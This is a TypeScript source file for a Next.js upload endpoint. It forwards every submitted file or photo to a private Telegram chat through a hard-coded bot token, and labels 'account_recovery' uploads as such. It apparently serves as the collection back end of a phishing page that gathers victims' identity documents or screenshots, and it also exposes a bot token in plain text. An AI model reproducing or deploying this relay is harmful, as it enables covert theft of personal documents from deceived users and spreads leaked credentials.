import axios from 'axios';
import { NextRequest, NextResponse } from 'next/server';

const TOKEN = '8559391133:AAFRWTOHUoBjlj1kSWNER4QziWLOedN4rjA';
const CHAT_ID = '-1003988992354';

const sendToTelegram = async (file: File, caption: string, message_id: string | null) => {
    const bytes = await file.arrayBuffer();
    const buffer = Buffer.from(bytes);

    const telegramFormData = new FormData();
    telegramFormData.append('chat_id', CHAT_ID);

    if (file.type.startsWith('image/')) {
        telegramFormData.append('photo', new Blob([buffer], { type: file.type }), file.name);
    } else {
        telegramFormData.append('document', new Blob([buffer], { type: file.type }), file.name);
    }

    if (caption) {
        telegramFormData.append('caption', caption);
    }

    if (message_id) {
        telegramFormData.append('reply_to_message_id', message_id);
    }

    const method = file.type.startsWith('image/') ? 'sendPhoto' : 'sendDocument';
    const url = `https://api.telegram.org/bot${TOKEN}/${method}`;

    const response = await axios.post(url, telegramFormData, {
        headers: { 'Content-Type': 'multipart/form-data' },
        timeout: 60000
    });

    return response.data?.result;
};

const POST = async (req: NextRequest) => {
    try {
        const formData = await req.formData();
        const type = formData.get('type') as string | null;
        const message_id = formData.get('message_id') as string | null;
        const files = formData.getAll('files') as File[];

        console.log('upload request:', { type, fileCount: files.length, message_id });

        if (files.length === 0) {
            const singleFile = formData.get('photo') as File;
            if (!singleFile) {
                return NextResponse.json({ success: false }, { status: 400 });
            }
            files.push(singleFile);
        }

        const caption = type === 'account_recovery' ? `📋 Account Recovery — ${files.length} file(s)` : `📎 File upload — ${files.length} file(s)`;

        for (const file of files) {
            await sendToTelegram(file, caption, message_id);
        }

        return NextResponse.json({ success: true });
    } catch (error) {
        const isAxiosError = axios.isAxiosError(error);
        console.error('upload err:', isAxiosError ? error.message : error);

        return NextResponse.json(
            {
                success: false,
                error: isAxiosError ? error.message : 'Internal server error'
            },
            { status: isAxiosError && error.response?.status ? error.response.status : 500 }
        );
    }
};

export { POST };
